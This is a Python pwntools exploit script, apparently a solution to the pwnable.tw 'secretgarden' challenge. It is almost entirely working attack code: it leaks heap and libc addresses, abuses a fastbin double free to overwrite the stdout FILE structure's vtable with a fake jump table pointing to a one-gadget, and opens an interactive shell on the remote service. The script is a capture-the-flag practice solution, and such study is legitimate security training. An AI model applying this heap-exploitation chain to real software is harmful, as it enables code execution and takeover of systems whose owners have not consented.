from pwn import *

local = False

if local:
	r = process("./secretgarden")
	malloc_hook = 0x3c4b10
	stdout_off = 0x3c5620
	io_file_jump_off = 0x3c36e0
	onegadget_off = 0xf1147
else:
	r = remote("chall.pwnable.tw", 10203)	
	malloc_hook = 0x3c3b10
	stdout_off = 0x3c4620
	io_file_jump_off = 0x3c26e0
	onegadget_off = 0xf0567

r.recvuntil("Your choice :")

def add(size, name, color):
	r.sendline(str(1))
	r.recvuntil("Length of the name :")
	r.sendline(str(size))
	r.recvuntil("The name of flower :")
	r.send(name)
	r.recvuntil("The color of the flower :")
	r.sendline(color)
	r.recvuntil("Your choice :")
def visit():
	r.sendline(str(2))
	return r.recvuntil("Your choice :")
def remove(index):
	r.sendline(str(3))
	r.sendlineafter(":", str(index))
	r.recvuntil("Your choice :")
def clean():	
	r.sendline(str(4))
	r.recvuntil("Your choice :")
# setup
# 0 
add(0x60, "\n", "color0")
# 1
add(0x60, "\n", "color1")
# 2
add(0x100, "\n", "color2")
# 3
add(0x20, "\n", "color3")

# leak heap_base address base on single link list of fastbin
remove(0)
remove(1)
clean()

# 0 -> duoi
add(0x60, "\n", "color1")

result = visit()
result = result.split("Name of the flower[0] :")[1][:6] + "\x00\x00"
heap_base = u64(result) - 0xa - 0x1000
print "Heap_base = " + hex(heap_base)

# back on setup
# 1 -> tren
add(0x60, "\n", "color1")

# leak libc_base addr base on chunk 0x110, malloc_hook = main_arena - 0x10
remove(2)
clean()
add(0x100, "aaaabbbb", "color2")

result = visit()
result = result.split("bbbb")[1][:6] + "\x00\x00"
libc_base = u64(result) - 88 - 0x10 - malloc_hook
stdout_addr = libc_base + stdout_off
io_file_jump_addr = libc_base + io_file_jump_off
onegadget_addr = libc_base + onegadget_off
print "Libc_base = " + hex(libc_base)


remove(2)
clean()

# make a fake _IO_file_jumps
# when printf function is called, it will call these function in _IO_file_jumps
# the order is: xsputn -> underflow -> write
# so we just need to overwrite the first one
# ALERT: there is something called "onegadget", it can give us the shell with approcited constraint
# So we need to test with avery position we can overwrite, and find the right one

# 2
payload = p64(0)*7 + p64(onegadget_addr)
add(0x100, payload, "color2")

# overwrite _IO_2_1_stdout_
# overwrite _IO_file_jumps field
fake_chunk = stdout_addr + 0x9d
fake_jump = heap_base + 0x30 + 0x1010 + 0x70 + 0x30 + 0x70 + 0x30 + 0x10
payload = "\x00"*0x13 + "\xff\xff\xff\xff" + p32(0) + "\x00"*0x10 + p64(fake_jump)

# double free
remove(0)
remove(1)
remove(0)
clean()

add(0x60, p64(fake_chunk), "color0")
add(0x60, "\n", "color2")
# 4 

add(0x60, "\n", "color4")
# 5 
#add(0x60, payload, "color5")
r.sendline(str(1))
r.recvuntil("Length of the name :")
r.sendline(str(0x60))
r.recvuntil("The name of flower :")
r.send(payload)

r.interactive()

# overwrite _IO_2_1_stdout
# overwrite _IO_file_jumps field
# overwrite xsputn

# There is no time of system and /bin/sh
# From now on, the rule changes
# Hello onegadget!
